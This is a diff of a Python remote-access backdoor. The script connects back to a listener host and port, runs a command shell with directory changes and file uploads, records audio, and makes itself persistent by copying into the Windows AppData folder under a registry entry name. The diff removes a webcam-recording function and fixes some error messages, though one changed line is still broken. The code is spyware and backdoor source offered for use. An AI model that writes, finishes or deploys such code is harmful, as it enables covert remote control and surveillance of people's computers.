@@ -14,9 +14,7 @@ import pyaudio
 import pyautogui
 import termcolor
 
-LHOST = "127.0.0.1";
-PORT = 5555
-
+LHOST = "127.0.0.1";PORT = 4444
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -86,21 +84,6 @@ def record(record_secs):
     wf.close()
 
 
-def cam_record():
-    camera = iio.get_reader("<video0>")
-    meta = camera.get_meta_data()
-    num_frames = 5 * int(meta["fps"])
-    delay = 1 / meta["fps"]
-
-    buffer = list()
-    for frame_counter in range(num_frames):
-        frame = camera.get_next_data()
-        buffer.append(frame)
-        time.sleep(delay)
-
-    camera.close()
-    iio.mimwrite("cam_record.mp4", buffer, macro_block_size=8, fps=meta["fps"])
-
 
 def persist(reg_name, copy_name):
     file_path = os.environ['appdata'] + '\\' + copy_name
@@ -141,9 +124,10 @@ def shell():
         elif cmd[:3] == 'cd ':
             try:
                 os.chdir(cmd[3:])
-                r
+                reliable_send(termcolor.colored("[+] Changed directory to {}".format(os.getcwd()), 'green'))
             except FileNotFoundError:
-                eliable_send(termcolor.colored("[-] Error: There is no dile called {}".cmd[3:], 'green'))
+                reliable_send(termcolor.colored("[-] Error: There is no file called {}".cmd[3:], 'green'))
+                continue
 
         elif cmd[:6] == 'upload':
             try:
